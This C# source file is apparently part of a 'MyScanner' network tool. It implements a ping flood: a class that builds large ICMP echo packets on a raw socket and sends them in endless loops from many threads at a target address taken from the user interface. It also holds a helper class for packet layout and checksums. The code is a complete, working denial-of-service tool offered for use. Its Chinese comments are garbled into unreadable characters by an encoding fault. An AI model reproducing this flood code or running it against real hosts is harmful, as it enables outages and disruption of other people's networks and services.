using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace MyScanner.MyClasses
{
    /// <summary>
    /// PingFlood����
    /// </summary>
    class CPingFlood
    {
        public int threadOrder;
        public string aimAddr;
        public int threadCount;
        MyScanner.Scanner ui;
        private static long packNum;
        private bool keepFlood;
        private static int threadFinish;

        /// <summary>
        /// ���캯��,��ʼ������
        /// </summary>
        /// <param name="ui"></param>
        public CPingFlood(Scanner ui)
        {
            this.ui = ui;
            aimAddr = ui.aimIPAddress.Text.ToString();
            threadCount = Scanner.threadCount;
        }

        /// <summary>
        /// ��ʼ����PingFlood����
        /// </summary>
        public void BeginPingFlood()
        {
            Thread[] pFloodThread = new Thread[threadCount];
            keepFlood = true;
            threadFinish = 0;
            packNum = 0;
            for (int i = 0; i < threadCount; i++)
            {
                pFloodThread[i] = new Thread(new ThreadStart(PingHost));
                pFloodThread[i].Start();
            }
        }

        /// <summary>
        /// ��������
        /// </summary>
        public void StopPingFlood()
        {
            keepFlood = false;
        }

        /// <summary>
        /// ��Ŀ����������Ping��
        /// </summary>
        public void PingHost()
        {
            //��ʼ��Socket�׽��� 
            //���������ֱ�Ϊ�� 
            // 1��������ַ�ĵ�ַģʽ���ϳ��õ�ΪAddressFamily.InterNetwork����IPv4��ַ�� 
            // 2��Socket�׽������ͣ�һ��ΪSocketType.Rawԭʼ���͡� 
            // 3������Э�����ͣ�����Ping�õ���Internet���Ʊ���Э��ProtocolType.Icmp.  
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);

            IPHostEntry clientInfo;
            try
            {
                clientInfo = Dns.GetHostByName(aimAddr);
            }
            catch (Exception)
            {
                //�������������� 
                UpdateTBResult(ui, "��������������\r\n");
                return;
            }
            // ȡ�ͻ���0�Ŷ˿� 
            EndPoint clientPoint = (EndPoint)new IPEndPoint(clientInfo.AddressList[0], 0);

            //����ICMP���� 
            int DataSize = 1024*63; // ICMP���ݰ���С���ܴ�С������64*1024
            int PacketSize = DataSize + 8;//�ܱ��ĳ��� 
            const int ICMP_ECHO = 8;
            IcmpPacket packet = new IcmpPacket(ICMP_ECHO, 0, 0, 45, 0, DataSize);

            //��ICMP������Ϣ������ת��ΪByte���ݰ� 
            Byte[] Buffer = new Byte[PacketSize];
            int index = packet.ConvertToByte(Buffer);
            //���ĳ��� 
            if (index != PacketSize)
            {
                //���ĳ���
                UpdateTBResult(ui, "���ĳ���\r\n");
                return;
            }
            //У��͵ļ��� 
            int count = (int)Math.Ceiling(((Double)index) / 2);
            UInt16[] Buffer2 = new UInt16[count];

            index = 0;
            for (int i = 0; i < count; i++)
            {
                //������byteת��Ϊһ��UInt16 
                Buffer2[i] = BitConverter.ToUInt16(Buffer, index);
                index += 2;
            }
            //��У��ͱ����������� 
            packet.CheckSum = IcmpPacket.SumOfCheck(Buffer2);
            // ����У��ͺ��ٴν�����ת��Ϊ���ݰ� 
            Byte[] SendData = new Byte[PacketSize];
            index = packet.ConvertToByte(SendData);
            //���ĳ��� 
            if (index != PacketSize)
            {
                UpdateTBResult(ui, "���ĳ���\r\n");
                return;
            }
            //�շ����� 
            while(keepFlood)
            {
                try
                {
                    socket.SendTo(SendData, PacketSize, SocketFlags.None, (EndPoint)clientPoint);
                    packNum++;
                }
                catch
                {
                    //�޷�����
                }
            }
            //�ر��׽��� 
            socket.Close();
            threadFinish++;
            if(threadFinish == threadCount)
            {
                UpdateTBResult(ui, "PingFlood�������������� " + aimAddr + " ������ " + packNum.ToString() + " �����ݰ�\r\n");
            }
        }

        /// <summary>
        /// �������̸߳��½�����Ϣ��ί��
        /// </summary>
        /// <param name="ui"></param>
        /// <param name="txt"></param>
        public delegate void DeleUpdateTBResult(Scanner ui, string txt);

        /// <summary>
        /// ���̸߳��½�����Ϣ
        /// </summary>
        /// <param name="ui"></param>
        /// <param name="txt"></param>
        public void UpdateTBResult(Scanner ui, string txt)
        {
            if (ui.InvokeRequired)
            {
                Delegate d = new DeleUpdateTBResult(UpdateTBResult);
                ui.Invoke(d, new Object[] { ui, txt });
            }
            else
            {
                ui.TBResult.Text += txt;
            }
        }
    }
    
    /// <summary>
    /// ICMP������
    /// </summary>
    public class IcmpPacket
    {
        private Byte _type; // �������� 
        private Byte _subCode; // �ִ������� 
        private UInt16 _checkSum; // ����У��� 
        private UInt16 _identifier; // ʶ��� 
        private UInt16 _sequenceNumber; // ���к�  
        private Byte[] _data; //���ݰ� 
        /// <summary>
        /// ��ʼ������ 
        /// </summary>
        /// <param name="type"></param>
        /// <param name="subCode"></param>
        /// <param name="checkSum"></param>
        /// <param name="identifier"></param>
        /// <param name="sequenceNumber"></param>
        /// <param name="dataSize"></param>
        public IcmpPacket(Byte type, Byte subCode, UInt16 checkSum, UInt16 identifier, UInt16 sequenceNumber, int dataSize)
        {
            _type = type;
            _subCode = subCode;
            _checkSum = checkSum;
            _identifier = identifier;
            _sequenceNumber = sequenceNumber;
            _data = new Byte[dataSize];
            //long newSize = 1024*1024*1024;
            for (int i = 0; i < dataSize; i++)
            {
                _data[i] = (byte)'#';
            }
        }
        public UInt16 CheckSum
        {
            get
            {
                return _checkSum;
            }
            set
            {
                _checkSum = value;
            }
        }
        /// <summary>
        /// ������ICMP������Ϣ������ת��ΪByte���ݰ�
        /// </summary>
        /// <param name="buffer"></param>
        /// <returns></returns>
        public int ConvertToByte(Byte[] buffer)
        {
            Byte[] b_type = new Byte[1] { _type };
            Byte[] b_code = new Byte[1] { _subCode };
            Byte[] b_cksum = BitConverter.GetBytes(_checkSum);
            Byte[] b_id = BitConverter.GetBytes(_identifier);
            Byte[] b_seq = BitConverter.GetBytes(_sequenceNumber);
            int i = 0;
            Array.Copy(b_type, 0, buffer, i, b_type.Length);
            i += b_type.Length;
            Array.Copy(b_code, 0, buffer, i, b_code.Length);
            i += b_code.Length;
            Array.Copy(b_cksum, 0, buffer, i, b_cksum.Length);
            i += b_cksum.Length;
            Array.Copy(b_id, 0, buffer, i, b_id.Length);
            i += b_id.Length;
            Array.Copy(b_seq, 0, buffer, i, b_seq.Length);
            i += b_seq.Length;
            Array.Copy(_data, 0, buffer, i, _data.Length);
            i += _data.Length;
            return i;
        }
        /// <summary>
        /// ����ICMP����Э�����У��ͼ���
        /// </summary>
        /// <param name="buffer"></param>
        /// <returns></returns>
        public static UInt16 SumOfCheck(UInt16[] buffer)
        {
            int sum = 0;
            for (int i = 0; i < buffer.Length; i++)
            {
                sum += (int)buffer[i];
            }
            sum = (sum >> 16) + (sum & 0xffff);
            sum += (sum >> 16);
            return (UInt16)(~sum);

        }
    }
}
   
